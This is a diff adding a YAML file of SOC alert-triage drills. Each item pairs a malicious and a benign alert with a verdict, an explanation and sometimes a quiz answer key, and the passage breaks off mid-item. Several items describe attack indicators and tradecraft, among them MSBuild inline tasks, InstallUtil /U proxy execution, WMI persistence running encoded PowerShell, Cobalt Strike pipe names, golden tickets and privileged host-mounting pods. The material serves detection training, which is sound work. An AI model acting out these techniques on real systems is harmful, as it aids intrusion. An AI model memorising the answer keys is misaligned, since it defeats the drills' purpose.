@@ -1,0 +1,1103 @@
+# ON SHIFT alerts — part 4: LOLBins, Kerberos/ADCS, Entra/token, cloud/k8s, email auth, linux, macOS, EDR tamper
+# v: 1 = true positive (escalate), 0 = false positive (close)
+# c: transferable concept tag (twins share it). diff: 1 easy, 2 medium, 3 hard/ambiguous
+# k: 0-based indexes into l of the deciding line(s); 'h' = host/user line decides
+# trap: scary (benign, alarming surface) | bland (malicious, mundane surface)
+# say: TTS script <= 25 words, no verdict. q: detection-lead follow-up {kind, ask, o, a, why}
+- id: z01
+  d: endpoint
+  src: Defender for Endpoint · DeviceProcessEvents
+  t: MSBuild.exe execution
+  h: WS-ENG-0051 · tkline
+  l: ['parent: devenv.exe', 'cmd: msbuild.exe C:\Users\tkline\src\payments-api\build.proj /t:Build', 'signer: Microsoft · user role: developer']
+  v: 0
+  x: T1127.001
+  c: lolbin-dev-context
+  diff: 2
+  k: [0]
+  say: 'MSBuild started by Visual Studio on a developer workstation, building a project file from the user source folder.'
+  tell: 'MSBuild is a LOLBin, but parented by Visual Studio building a repo project under a dev account is just Tuesday. Context is the control, not the binary name.'
+- id: z02
+  d: endpoint
+  src: Defender for Endpoint · DeviceProcessEvents
+  t: MSBuild.exe execution
+  h: WS-FIN-0233 · rowens
+  l: ['parent: OUTLOOK.EXE', 'cmd: msbuild.exe C:\Users\rowens\AppData\Local\Temp\update.xml', 'note: xml contains inline <Task> C# with VirtualAlloc']
+  v: 1
+  x: T1127.001
+  c: lolbin-dev-context
+  diff: 2
+  k: [0]
+  say: 'MSBuild started by Outlook on a finance workstation, running an XML from Temp with an inline C sharp task calling VirtualAlloc.'
+  q:
+    kind: pivot
+    ask: 'First pivot?'
+    o: ['Pull the email and attachment that dropped update.xml', 'Block msbuild.exe on all endpoints', 'Reset rowens password and close']
+    a: 0
+    why: 'Find the delivery email first: it scopes other recipients and the payload.'
+  tell: 'Same MSBuild, but Outlook is the parent and the project is an inline C# task in Temp. Finance users do not compile. That is code exec hiding behind a trusted compiler.'
+- id: z03
+  d: endpoint
+  src: Sysmon · Event ID 1
+  t: InstallUtil invoked with uninstall flag
+  h: WS-IT-0004 · SYSTEM
+  l: ['parent: ccmexec.exe', 'cmd: installutil.exe /u /logfile= C:\Windows\CCM\Cache\app.dll', 'signer: Microsoft']
+  v: 0
+  x: T1218.004
+  c: installutil-exec
+  diff: 2
+  k: [0]
+  say: 'InstallUtil with the uninstall flag, launched by the SCCM client, against a DLL in the SCCM cache folder.'
+  q:
+    kind: tune
+    ask: 'Best tuning?'
+    o: ['Exclude installutil.exe /u everywhere', 'Exclude host WS-IT-0004', 'Exclude parent ccmexec.exe + path C:\Windows\CCM\Cache\']
+    a: 2
+    why: 'Parent + path scope keeps the /U trick detectable from any other parent.'
+  tell: 'InstallUtil /u out of the SCCM cache, parented by CcmExec, is a normal app (un)install. Check the parent and the path before you reach for the pager.'
+- id: z04
+  d: endpoint
+  src: Sysmon · Event ID 1
+  t: InstallUtil invoked with uninstall flag
+  h: WS-SALES-0612 · bmorris
+  l: ['parent: wscript.exe', 'cmd: installutil.exe /logfile= /LogToConsole=false /U C:\Users\Public\svc.dll', 'signer: unsigned']
+  v: 1
+  x: T1218.004
+  c: installutil-exec
+  diff: 2
+  k: [0]
+  say: 'InstallUtil with the uninstall flag, launched by Windows Script Host, against an unsigned DLL in the Public user folder.'
+  tell: 'The /U uninstall trick runs the Uninstall method so your code fires without a real install. Wscript parent + unsigned DLL in Public = proxy execution, escalate.'
+- id: z05
+  d: endpoint
+  src: Sysmon · Event ID 1
+  t: Odbcconf registered a DLL
+  h: WS-DBA-0071 · SYSTEM
+  l: ['parent: msiexec.exe', 'cmd: odbcconf.exe /a {regsvr C:\Program Files\Common Files\Vendor\odbcdriver.dll}', 'signer: valid (vendor)']
+  v: 0
+  x: T1218.008
+  c: odbcconf-regsvr
+  diff: 3
+  trap: scary
+  k: [2]
+  say: 'Odbcconf regsvr loads a DLL from Program Files, launched by the Windows installer. The DLL carries a valid vendor signature.'
+  tell: 'odbcconf regsvr looks like a LOLBin because it is one, but a signed ODBC driver registered by an MSI installer is exactly its day job. Signer + install path clear it.'
+- id: z06
+  d: endpoint
+  src: Sysmon · Event ID 1
+  t: Cmstp processed an INF
+  h: WS-REMOTE-0318 · deploy
+  l: ['parent: msiexec.exe', 'cmd: cmstp.exe /ni /s C:\Program Files\CiscoVPN\profiles\corp.inf', 'inf: standard connection-manager profile, no RunPreSetupCommandsSection']
+  v: 0
+  x: T1218.003
+  c: cmstp-inf
+  diff: 3
+  trap: scary
+  k: [2]
+  say: 'Cmstp silently installs an INF from the VPN program folder. The INF is a plain connection profile with no command sections.'
+  tell: 'Cmstp is abused to run commands from a crafted INF, so read the INF. A plain connection-manager profile with no command sections is just a VPN install. The payload lives in the INF, not the process name.'
+- id: z07
+  d: endpoint
+  src: Sysmon · Event ID 21
+  t: WMI permanent event subscription created
+  h: SRV-APP-07 · SYSTEM
+  l: ['filter: EventFilter "Updater" · WITHIN 60 __InstanceModificationEvent Win32_LocalTime', 'consumer: CommandLineEventConsumer → powershell -e <b64>', 'binding: created by powershell.exe']
+  v: 1
+  x: T1546.003
+  c: wmi-event-sub
+  diff: 3
+  k: [1]
+  say: 'WMI subscription named Updater. Clock-based filter every sixty seconds, bound to a command line consumer that runs encoded PowerShell.'
+  q:
+    kind: contain
+    ask: 'Best containment step?'
+    o: ['Delete the event consumer and close', 'Isolate SRV-APP-07, then remove filter, consumer and binding', 'Reboot SRV-APP-07 to clear it']
+    a: 1
+    why: 'Isolate first; reboots do not clear WMI repo persistence and deleting alone loses scope.'
+  tell: 'A CommandLineEventConsumer tied to a clock-based filter is fileless persistence that survives reboots and lives in the WMI repo. Nobody legit schedules PowerShell this way.'
+- id: z08
+  d: endpoint
+  src: Sysmon · Event ID 21
+  t: WMI permanent event subscription created
+  h: SRV-APP-09 · SYSTEM
+  l: ['filter: EventFilter "SCM Event Log Filter"', 'consumer: NTEventLogEventConsumer "SCM Event Log Consumer"', 'binding: built-in Windows subscription · identical on every server in the image']
+  v: 0
+  x: T1546.003
+  c: wmi-event-sub
+  diff: 3
+  trap: scary
+  k: [1]
+  say: 'WMI subscription named SCM Event Log. The consumer only writes to the event log, and it is identical on every server image.'
+  q:
+    kind: tune
+    ask: 'Best tuning?'
+    o: ['Suppress Sysmon 21 on all servers', 'Allowlist the SCM Event Log filter, consumer, binding by name + type', 'Allowlist any NTEventLogEventConsumer']
+    a: 1
+    why: 'Pin the exact built-in triple. Type-wide or event-wide suppression hides real persistence.'
+  tell: 'WMI subscriptions are also how Windows and real monitoring agents work. The SCM Event Log subscription ships with Windows and only writes log entries. The tell is the consumer type: log-writer vs command-runner.'
+- id: z09
+  d: endpoint
+  src: Defender for Endpoint · DeviceEvents
+  t: Named pipe created
+  h: WS-ACCT-0412 · jmiller
+  l: ['pipe: \\.\pipe\msagent_3f2 · creator: rundll32.exe (no cmdline args)', 'pipe: \\.\pipe\MSSE-7a1-server', 'parent of rundll32: svchost (orphaned tree)']
+  v: 1
+  x: T1559
+  c: named-pipe-c2
+  diff: 3
+  trap: bland
+  k: [0]
+  say: 'Rundll32 with no arguments creates pipes named msagent and MSSE dash server on an accounting workstation.'
+  tell: 'Default Cobalt Strike SMB-beacon pipe names (msagent_*, MSSE-*-server) spawned by argument-less rundll32 are a textbook C2 tell. Learn the default pipe names, catch the lazy operators.'
+- id: z10
+  d: endpoint
+  src: Defender for Endpoint · DeviceEvents
+  t: Named pipe created
+  h: SRV-FILE-02 · administrator
+  l: ['pipe: \\.\pipe\PSEXESVC · creator: PSEXESVC.exe', 'source host: WS-IT-0004 (admin jumpbox)', 'change: CHG0044120 patch deploy window']
+  v: 0
+  x: T1559
+  c: named-pipe-c2
+  diff: 2
+  trap: scary
+  k: [1, 2]
+  say: 'PsExec service pipe on a file server, coming from the admin jumpbox during a ticketed patch window.'
+  tell: 'A PSEXESVC pipe from the known admin jumpbox inside a change window is Sysinternals PsExec doing sanctioned remote admin. Same mechanism as C2, totally different story — the source host and the ticket are the tell.'
+- id: z11
+  d: endpoint
+  src: Sysmon · Event ID 10
+  t: Process accessed LSASS
+  h: WS-ENG-0088 · priya.n
+  l: ['target: lsass.exe · granted access: 0x1000', 'source: C:\ProgramData\Microsoft\Windows Defender\Platform\...\MsMpEng.exe (signed Microsoft)', 'call trace resolves to Microsoft modules only']
+  v: 0
+  x: T1003.001
+  c: lsass-access
+  diff: 3
+  trap: scary
+  k: [1]
+  say: 'LSASS opened with query limited access by Defender antimalware engine, signed Microsoft, from its platform folder. Call trace shows only Microsoft modules.'
+  q:
+    kind: tune
+    ask: 'Best tuning?'
+    o: ['Exclude source image MsMpEng.exe by name only', 'Exclude granted access 0x1000 globally', 'Exclude MsMpEng.exe by full path + Microsoft signer']
+    a: 2
+    why: 'Name-only is spoofable by a renamed binary; mask-wide hides tools that ask small.'
+  tell: 'Not every LSASS handle is theft. Defender, EDR and Windows Error Reporting all touch LSASS legitimately. The source image path and signer decide it. Do not lean on the mask: Mimikatz sekurlsa asks for 0x1010/0x1410, which looks small too.'
+- id: z12
+  d: endpoint
+  src: Defender for Endpoint · DeviceImageLoadEvents
+  t: Signed binary loaded unsigned sibling DLL
+  h: WS-MKT-0410 · asingh
+  l: ['process: C:\Program Files (x86)\Vendor\LabelPrint\LabelPrint.exe (signed)', 'loaded: C:\Program Files (x86)\Vendor\LabelPrint\pdfcore.dll (unsigned)', 'DLL hash matches vendor installer · same load on 300 hosts since 2024']
+  v: 0
+  x: T1574.001
+  c: dll-sideload-signer
+  diff: 3
+  trap: scary
+  k: [2]
+  say: 'Signed label printing app loads an unsigned DLL from its own Program Files folder. Hash matches the vendor installer, seen on 300 hosts.'
+  q:
+    kind: tune
+    ask: 'Best tuning?'
+    o: ['Allowlist pdfcore.dll by hash for LabelPrint.exe', 'Allowlist any unsigned DLL under Program Files (x86)', 'Allowlist DLL name pdfcore.dll anywhere']
+    a: 0
+    why: 'Hash + loader pair is tight. Name-only lets an attacker drop the same name in Temp.'
+  tell: 'Sideloading alerts fire on signed-exe-loads-unsigned-DLL, but plenty of vendors ship unsigned helper DLLs. Admin-only install folder, hash matching the installer, fleet-wide prevalence = noise. The scary version loads from a user-writable path with a hash nobody else has.'
+- id: z13
+  d: endpoint
+  src: Defender for Endpoint · DeviceProcessEvents
+  t: Process launched from Downloads
+  h: WS-HR-0177 · dlopez
+  l: ['cmd: C:\Users\dlopez\Downloads\Invoice_Oct.pdf.exe', 'parent: explorer.exe', 'icon: Adobe PDF · origin: email attachment']
+  v: 1
+  x: T1036.007
+  c: double-extension
+  diff: 1
+  k: [0]
+  say: 'HR user double-clicks Invoice October dot P D F dot E X E from Downloads. PDF icon, arrived as an email attachment.'
+  tell: 'Invoice_Oct.pdf.exe is a PDF icon glued onto a binary. The second extension is the only one Windows obeys. Double-extension + fake icon + email origin = user got got.'
+- id: z14
+  d: endpoint
+  src: Sysmon · Event ID 1
+  t: Process create on file server
+  h: SRV-FILE-02 · SYSTEM
+  l: ['image: C:\ProgramData\svchost.exe · OriginalFileName: 7z.exe', 'cmd: svchost.exe a -p<redacted> -mx1 arc.7z \\?\C:\Finance', 'signer: Igor Pavlov (7-Zip)']
+  v: 1
+  x: T1036.003
+  c: renamed-binary
+  diff: 2
+  trap: bland
+  k: [0]
+  say: 'A process named svchost runs from ProgramData. Its original file name is 7 zip, and it is archiving the Finance share with a password.'
+  tell: 'The signer and OriginalFileName say 7-Zip; the filename says svchost. Attackers rename legit tools to blend in, then archive a share before exfil. Trust the PE metadata over the filename.'
+- id: z15
+  d: identity
+  src: Entra ID · SigninLogs
+  t: Authentication via device code flow
+  h: rkhan@corp.com
+  l: ['authMethod: deviceCode · app: Microsoft Office', 'IP: 185.x.x.x (hosting, Netherlands) · user is US-based', 'followed by: mailbox access + OAuth grant 3 min later']
+  v: 1
+  x: T1528
+  c: device-code-phish
+  diff: 2
+  trap: bland
+  k: [1]
+  say: 'Device code sign-in to Microsoft Office for a US laptop user, completed from a Netherlands hosting IP, then mailbox access and an OAuth grant.'
+  q:
+    kind: contain
+    ask: 'Best containment step?'
+    o: ['Revoke rkhan sessions and refresh tokens, remove the OAuth grant', 'Reset rkhan password only', 'Block the Netherlands for all users']
+    a: 0
+    why: 'The attacker holds tokens, not the password. Revoke tokens and the grant they made.'
+  tell: 'Device code phishing: victim types a code on a real Microsoft page, attacker on a foreign host rides the resulting token. Device-code auth from a datacenter IP for a desktop user is the fingerprint.'
+- id: z16
+  d: identity
+  src: Entra ID · SigninLogs
+  t: Authentication via device code flow
+  h: jdoe@corp.com
+  l: ['authMethod: deviceCode · app: Microsoft Authentication Broker', 'IP: corp egress · device enrolling into Intune', 'ticket: INC0101233 new conference-room device setup']
+  v: 0
+  x: T1528
+  c: device-code-phish
+  diff: 2
+  trap: scary
+  k: [1]
+  say: 'Device code sign-in through the authentication broker, from corporate egress, while a conference room device enrolls into Intune under a ticket.'
+  q:
+    kind: tune
+    ask: 'Best tuning?'
+    o: ['Disable the device code alert tenant-wide', 'Allow device code only from corp egress for enrollment broker', 'Allowlist user jdoe for device code']
+    a: 1
+    why: 'Scope to location + app. Allowlisting a user hands phishers a pre-approved victim.'
+  tell: 'Device code is also the normal flow for input-constrained devices (kiosks, conference rooms, CLI logins). Corp IP + enrollment broker + a matching ticket makes this the boring kind.'
+- id: z17
+  d: identity
+  src: Entra ID · AuditLogs
+  t: Conditional Access policy updated
+  h: corp.com tenant
+  l: ['policy: "Require MFA for all users" → state Disabled', 'actor: breakglass2@corp.com (last used never)', 'no CHG ticket · actor added to Global Admin 40 min earlier']
+  v: 1
+  x: T1556.009
+  c: ca-policy-change
+  diff: 2
+  k: [0, 2]
+  say: 'The require MFA for all users policy is switched off by a never-used break glass account, promoted to Global Admin forty minutes earlier, no ticket.'
+  q:
+    kind: contain
+    ask: 'First move?'
+    o: ['Email the identity team to ask about it', 'Delete breakglass2 from the tenant', 'Re-enable the policy and block breakglass2 sign-in, then hunt']
+    a: 2
+    why: 'Close the door and freeze the actor; deleting the account destroys evidence.'
+  tell: 'Turning off the MFA policy is how an attacker keeps the door open after they are in. A dormant break-glass account freshly elevated, no ticket, disabling MFA = active intrusion.'
+- id: z18
+  d: identity
+  src: Entra ID · AuditLogs
+  t: Conditional Access policy updated
+  h: corp.com tenant
+  l: ['policy: "Require compliant device" → group "Branch-TX staff" added to include list', 'actor: ca_admin@corp.com (identity team)', 'change: CHG0044781 approved']
+  v: 0
+  x: T1556.009
+  c: ca-policy-change
+  diff: 2
+  k: [0, 2]
+  say: 'A compliant device policy gains a new branch staff group in its include list, by an identity team admin, under an approved change.'
+  tell: 'CA policies change all the time as the business grows. A known identity admin widening who a policy covers, under an approved change, is housekeeping. The verdict lives in who, what direction, and the ticket.'
+- id: z19
+  d: identity
+  src: Entra ID · AuditLogs
+  t: Credential added to service principal
+  h: 'app: Reporting-Connector'
+  l: ['action: Add service principal credentials (clientSecret)', 'actor: a guest user, first-ever admin action', 'then: app called Graph Mail.Read across 30 mailboxes']
+  v: 1
+  x: T1098.001
+  c: sp-credential-add
+  diff: 2
+  trap: bland
+  k: [1]
+  say: 'A new client secret on the Reporting Connector app, added by a guest on their first admin action. Then the app reads thirty mailboxes.'
+  q:
+    kind: contain
+    ask: 'Best containment step?'
+    o: ['Remove the new secret, disable the guest, review app permissions', 'Delete the Reporting-Connector app', 'Rotate every app secret in the tenant']
+    a: 0
+    why: 'Kill the key and the actor surgically; deleting the app breaks prod and evidence.'
+  tell: 'A new secret on an existing app is a stealthy backdoor: the app already has consented permissions, now the attacker holds a key to them. Guest actor + immediate mass Graph calls = escalate.'
+- id: z20
+  d: identity
+  src: Entra ID · AuditLogs
+  t: Credential added to service principal
+  h: 'app: Backup-Integration'
+  l: ['action: Add service principal credentials (clientSecret)', 'actor: app owner (platform team) · prior secret expires in 14 days', 'change: CHG0044812 secret rotation']
+  v: 0
+  x: T1098.001
+  c: sp-credential-add
+  diff: 2
+  k: [1]
+  say: 'A new client secret on the Backup Integration app, added by its platform team owner, two weeks before the old secret expires.'
+  tell: 'Secrets expire, so apps get new ones. Owner-driven rotation ahead of an expiry, with a ticket, is lifecycle hygiene. Compare the actor to the app owner and look for the old secret aging out.'
+- id: z21
+  d: identity
+  src: Entra ID · SigninLogs
+  t: Sign-in with pre-existing session token
+  h: cfo.smith@corp.com
+  l: ['authRequirement: previouslySatisfied (no interactive auth)', 'session ID: same as the corp laptop · new device + new IP, bulletproof-host ASN', 'CA: satisfied by claim in token']
+  v: 1
+  x: T1550.004
+  c: token-replay
+  diff: 3
+  trap: bland
+  k: [1]
+  say: 'CFO sign-in satisfied by an existing session. Same session ID as the corp laptop, but from a new device on a bulletproof hosting network.'
+  q:
+    kind: contain
+    ask: 'Best containment step?'
+    o: ['Force MFA re-prompt for cfo.smith', 'Reset password and close', 'Revoke sessions and isolate the corp laptop the cookie came from']
+    a: 2
+    why: 'MFA and password do not kill a stolen cookie. Revoke, then find the infostealer on the source.'
+  tell: 'Stolen session cookies/PRTs let an attacker skip MFA entirely — the token already says it was satisfied. A session claim replayed from a brand-new device on a sketchy ASN is token theft, not a login.'
+- id: z22
+  d: identity
+  src: Entra ID · AADNonInteractiveUserSignInLogs
+  t: Sign-in with pre-existing session token
+  h: svc_reporting@corp.com
+  l: ['authRequirement: previouslySatisfied · app: Power BI service', 'IP: corp datacenter egress · same ASN as always', 'cadence: hourly refresh, unchanged for 6 months']
+  v: 0
+  x: T1550.004
+  c: token-replay
+  diff: 2
+  k: [1]
+  say: 'Non-interactive Power BI token refresh for a reporting account, from corporate datacenter egress on the usual network, hourly for six months.'
+  q:
+    kind: tune
+    ask: 'Best tuning?'
+    o: ['Suppress previouslySatisfied for svc_reporting from its known ASN + app', 'Suppress all non-interactive sign-ins', 'Suppress svc_reporting entirely']
+    a: 0
+    why: 'Keep the alert live if that token shows up from a new ASN or app.'
+  tell: 'Non-interactive token refreshes are the normal heartbeat of service accounts and background apps. Same ASN, same hourly cadence, same app = baseline. Token replay is only scary when the device or geography jumps.'
+- id: z23
+  d: identity
+  src: Windows Security · 4768
+  t: AS-REP returned for account without pre-auth
+  h: SRV-DC-01
+  l: ['accounts: 3 flagged "Do not require Kerberos preauthentication"', 'reply: RC4 AS-REP returned · requestor 10.20.4.17', 'ROE SECOPS-2291: 10.20.4.17 is the assessment laptop, window this week']
+  v: 0
+  x: T1558.004
+  c: asrep-source
+  diff: 3
+  trap: scary
+  k: [2]
+  say: 'Three accounts without Kerberos pre-auth return RC4 AS-REPs to one internal IP. Rules of engagement list that IP as this week assessment laptop.'
+  tell: 'AS-REP roasting pulls crackable hashes for pre-auth-disabled accounts. But the requestor here is the sanctioned assessment box inside an approved engagement window. Same technique, authorized hands. Always check the source against your ROE before you panic.'
+- id: z24
+  d: identity
+  src: Windows Security · 4769
+  t: Burst of RC4 service ticket requests
+  h: SRV-DC-01
+  l: ['account: svc_scanner · 48 TGS requests, enc 0x17 (RC4)', 'source: 10.20.0.9 = Tenable scanner (CMDB)', 'scan window: monthly credentialed scan, scheduled']
+  v: 0
+  x: T1558.003
+  c: kerberoast-source
+  diff: 3
+  trap: scary
+  k: [1]
+  say: 'Forty eight RC4 service ticket requests from svc scanner. Source IP maps to the Tenable scanner in the CMDB, during its monthly scan.'
+  q:
+    kind: tune
+    ask: 'Best tuning?'
+    o: ['Exclude enc 0x17 from the Kerberoast rule', 'Exclude svc_scanner from source 10.20.0.9 during the scan window', 'Exclude svc_scanner from any source']
+    a: 1
+    why: 'Account + source + window. A stolen svc_scanner roasting from a laptop still fires.'
+  tell: 'Credentialed vuln scanners enumerate SPNs and can look exactly like Kerberoasting. The source IP maps to Tenable in the CMDB during its scan window. Baseline your scanners or you will escalate them every month.'
+- id: z25
+  d: identity
+  src: Defender for Identity · Kerberos activity
+  t: Kerberos TGS activity for Administrator
+  h: CORP\Administrator
+  l: ['ticket lifetime: 10 years (domain policy max 10 hours)', 'no 4768 TGT issued to this account on any DC in 7 days', 'TGS requests from WS-HR-0177, not an admin host']
+  v: 1
+  x: T1558.001
+  c: golden-ticket
+  diff: 3
+  k: [0, 1]
+  say: 'Administrator presents a ticket with a ten year lifetime, but no domain controller issued it a ticket granting ticket all week.'
+  q:
+    kind: contain
+    ask: 'What actually evicts this?'
+    o: ['Reset the Administrator password', 'Reset krbtgt twice, spaced past ticket lifetime', 'Disable the Administrator account']
+    a: 1
+    why: 'The ticket is signed with krbtgt. User resets do nothing to a forged TGT.'
+  tell: 'A TGT no DC issued, with a ten-year lifetime (the Mimikatz golden default), was forged with the krbtgt key. The account password is irrelevant. Reset krbtgt twice.'
+- id: z26
+  d: identity
+  src: Okta · System Log
+  t: API token created for privileged user
+  h: okta-automation@corp.com
+  l: ['event: system.api_token.create', 'actor: iam-terraform (service account)', 'source: CI runner IP (allowlisted) · run: scheduled IAM apply']
+  v: 0
+  x: T1098.001
+  c: okta-api-token
+  diff: 2
+  trap: scary
+  k: [2]
+  say: 'Okta API token created for a privileged automation user by the Terraform service account, from the allowlisted CI runner during a scheduled apply.'
+  tell: 'Okta API tokens are a real persistence vector, but IaC pipelines mint them legitimately. A known Terraform service account from an allowlisted CI runner on a scheduled apply is automation, not an attacker.'
+- id: z27
+  d: identity
+  src: Entra ID · AuditLogs
+  t: New hybrid authentication agent registered
+  h: corp.com tenant
+  l: ['event: Register Pass-through Authentication agent', 'host: WKSTN-0921, not in server inventory · registered by GA msmith 10 min after a new-ASN sign-in', 'no CHG · Seamless SSO config also modified 2 min later']
+  v: 1
+  x: T1556.007
+  c: pta-backdoor
+  diff: 3
+  k: [1]
+  say: 'A pass-through authentication agent registered on a workstation, not a server, by a global admin minutes after a sign-in from a new network.'
+  tell: 'A rogue PTA agent sees every on-prem password in cleartext as users sign in — a hybrid-identity backdoor. Registered from a workstation, no ticket, by a GA with a fresh odd sign-in? That is a credential-harvesting implant.'
+- id: z28
+  d: cloud
+  src: AWS · CloudTrail
+  t: EBS snapshot attribute modified
+  h: 'acct: 4471-xxxx-prod'
+  l: ['event: ModifySnapshotAttribute · createVolumePermission add', 'userId: 999999999999 (external, unknown account)', 'snapshot: of prod-db volume · caller: ci-deployer']
+  v: 1
+  x: T1537
+  c: ebs-snapshot-share
+  diff: 2
+  trap: bland
+  k: [1]
+  say: 'Volume permission on a prod database snapshot granted to an outside AWS account nobody recognizes. Caller is the CI deployer role.'
+  q:
+    kind: contain
+    ask: 'Best containment step?'
+    o: ['Delete the prod-db snapshot', 'Open a ticket with AWS support', 'Remove the createVolumePermission and lock down ci-deployer creds']
+    a: 2
+    why: 'Revoke the share and the compromised caller; deleting the snapshot loses evidence.'
+  tell: 'Sharing a DB snapshot to an outside account ID is exfiltration without a single byte leaving as "data" — they just restore your volume in their account. Watch createVolumePermission adds to unknown accounts.'
+- id: z29
+  d: cloud
+  src: AWS · CloudTrail
+  t: EBS snapshot created
+  h: 'acct: 4471-xxxx-prod'
+  l: ['event: CreateSnapshot · 40 volumes tagged backup=daily', 'caller: arn:...:role/AWSBackupRole', 'source: backup.amazonaws.com · schedule: 02:00 UTC daily']
+  v: 0
+  x: T1578.001
+  c: ebs-snapshot-share
+  diff: 1
+  k: [1]
+  say: 'Forty volumes snapshotted at two AM by the AWS Backup service role, on the daily schedule. No sharing to other accounts.'
+  tell: 'AWS Backup snapshots volumes every night via its service role — that is the service working. No sharing to another account, no human caller. Snapshots are only scary when they get shared out or copied cross-region by a user.'
+- id: z30
+  d: cloud
+  src: AWS · CloudTrail
+  t: High-volume object reads from S3
+  h: 'bucket: corp-customer-pii'
+  l: ['event: GetObject x 9,400 in 6 min', 'caller: role/web-frontend via STS (creds seen off the instance)', 'sourceIP: 185.x.x.x (Tor exit) not the ECS subnet']
+  v: 1
+  x: T1530
+  c: s3-mass-read
+  diff: 2
+  k: [2]
+  say: 'Nine thousand reads from the customer PII bucket using the web frontend role, coming from a Tor exit instead of the app subnet.'
+  tell: 'Frontend role credentials reading the PII bucket from a Tor exit outside the app subnet = stolen role creds (SSRF/IMDS). The role is legit; the place it is being used from is not.'
+- id: z31
+  d: cloud
+  src: AWS · CloudTrail
+  t: High-volume object reads from S3
+  h: 'bucket: corp-analytics-lake'
+  l: ['event: GetObject x 12,000', 'caller: role/glue-etl · sourceIP: VPC endpoint', 'schedule: nightly ETL job, matches 90-day baseline']
+  v: 0
+  x: T1530
+  c: s3-mass-read
+  diff: 2
+  k: [1]
+  say: 'Twelve thousand reads from the analytics lake by the Glue ETL role through a VPC endpoint, matching the nightly ninety day baseline.'
+  tell: 'Data lakes exist to be read in bulk. The ETL role hitting its own lake through a VPC endpoint on schedule is the job. Compare caller, source, and volume to baseline before mass GetObject scares you.'
+- id: z32
+  d: cloud
+  src: AWS · GuardDuty
+  t: Instance credentials used from external address
+  h: 'acct: 4471-xxxx-prod'
+  l: ['finding: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS', 'role creds minted for i-0ab... seen from 45.x.x.x', 'instance i-0ab still running, never had a public IP']
+  v: 1
+  x: T1552.005
+  c: imds-cred-offbox
+  diff: 1
+  k: [1, 2]
+  say: 'Role credentials issued to one EC2 instance are being used from an outside IP. That instance never had a public address.'
+  tell: 'IMDS role credentials are scoped to the instance; seeing them used from an IP that is not that instance means they were pulled off the box (SSRF, metadata theft). GuardDuty literally names it. Escalate and rotate.'
+- id: z33
+  d: cloud
+  src: GCP · Cloud Audit Logs
+  t: Service account key created
+  h: 'project: corp-prod-data'
+  l: ['method: google.iam.admin.v1.CreateServiceAccountKey', 'principal: terraform@ci.iam.gserviceaccount.com', 'origin: Cloud Build trigger on main · commit linked']
+  v: 0
+  x: T1098.001
+  c: gcp-sa-key
+  diff: 2
+  k: [1, 2]
+  say: 'A service account key created in the prod data project by the Terraform principal, from a Cloud Build trigger linked to a commit on main.'
+  tell: 'Long-lived SA keys are risky, but IaC creates them deliberately. Terraform principal, Cloud Build origin, a commit you can open = sanctioned. The key is scary when a human or odd principal makes it by hand.'
+- id: z34
+  d: cloud
+  src: GCP · Cloud Audit Logs
+  t: Service account key created
+  h: 'project: corp-prod-data'
+  l: ['method: CreateServiceAccountKey on sa: bq-admin', 'principal: user dev-intern@corp.com from 103.x.x.x (foreign)', 'then: SetIamPolicy granting own user owner on the project']
+  v: 1
+  x: T1098.001
+  c: gcp-sa-key
+  diff: 2
+  k: [1]
+  say: 'An intern user, from a foreign IP, creates a key for the BigQuery admin service account, then grants their own user project owner.'
+  tell: 'An interactive user minting a key for a privileged SA from a foreign IP, then granting themselves Owner, is a privilege-escalation chain. Human-made keys for admin SAs + an IAM self-grant = escalate.'
+- id: z35
+  d: cloud
+  src: Azure · AzureActivity
+  t: Diagnostic settings removed
+  h: 'sub: corp-prod'
+  l: ['operation: Microsoft.Insights/diagnosticSettings/delete', 'caller: platform-iac SPN · correlation to Terraform run', 'immediately recreated pointing to new Log Analytics ws']
+  v: 0
+  x: T1685.002
+  c: disable-cloud-log
+  diff: 3
+  trap: scary
+  k: [2]
+  say: 'Diagnostic settings deleted by the platform IaC service principal during a Terraform run, then recreated seconds later pointing to a new workspace.'
+  q:
+    kind: tune
+    ask: 'Best tuning?'
+    o: ['Suppress diagnosticSettings/delete from platform-iac SPN', 'Suppress all diagnosticSettings/delete', 'Alert only if no recreate by the same caller within 5 min']
+    a: 2
+    why: 'Recreate-window logic still fires if the IaC SPN itself is stolen and kills logging.'
+  tell: 'Deleting a diagnostic setting trips "logging stopped" alarms, but IaC deletes-and-recreates resources constantly. The setting is recreated seconds later by the same SPN. Look for the recreate before you call it a cover-up.'
+- id: z36
+  d: cloud
+  src: Azure · AzureActivity
+  t: Diagnostic settings removed
+  h: 'sub: corp-prod'
+  l: ['operation: diagnosticSettings/delete on Key Vault + NSG flow logs', 'caller: user guest account, no Terraform correlation', 'no recreate · followed by Key Vault secret list']
+  v: 1
+  x: T1685.002
+  c: disable-cloud-log
+  diff: 3
+  k: [2]
+  say: 'Diagnostic settings deleted on a Key Vault and flow logs by a guest user. Nothing recreates them, and then the vault secrets get listed.'
+  tell: 'Same delete op, but a guest with no IaC footprint kills logging on the Key Vault and does NOT recreate it, then lists secrets in the dark. No recreate + a guest actor = someone turning off the cameras.'
+- id: z37
+  d: cloud
+  src: Kubernetes · audit log
+  t: Exec into running pod
+  h: 'cluster: prod-eks'
+  l: ['verb: create pods/exec · pod: payments-api-7f', 'user: sre-oncall (oidc group: platform-sre)', 'command: /bin/sh · linked incident: INC0102991']
+  v: 0
+  x: T1609
+  c: k8s-exec-context
+  diff: 2
+  k: [1]
+  say: 'Shell exec into the payments API pod by the on-call SRE, in the platform SRE group, linked to an open incident.'
+  tell: 'kubectl exec is how SREs debug prod. An on-call engineer in the platform-sre group shelling in during a tracked incident is the job. Exec is scary from an unexpected identity or a service account, not a human on-call.'
+- id: z38
+  d: cloud
+  src: Kubernetes · audit log
+  t: Privileged pod scheduled with host mounts
+  h: 'cluster: prod-eks'
+  l: ['pod: tools-x7 · securityContext.privileged=true', 'volume: hostPath / → /host · image: alpine from public registry', 'created by: sa default in namespace web (web has no business doing this)']
+  v: 1
+  x: T1611
+  c: container-escape
+  diff: 3
+  k: [2]
+  say: 'A privileged alpine pod mounting the node root filesystem, created by the default service account of the web namespace.'
+  tell: 'A privileged pod mounting the node root filesystem is a container escape by design — chroot to /host and you own the node. A random alpine from the default SA in a web namespace = escalate hard.'
+- id: z39
+  d: cloud
+  src: Kubernetes · audit log
+  t: ClusterRoleBinding to cluster-admin created
+  h: 'cluster: prod-eks'
+  l: ['verb: create clusterrolebinding · role: cluster-admin → sa: flux-system', 'user: system:serviceaccount:flux-system:kustomize-controller', 'source: GitOps sync, manifest in infra repo, PR approved']
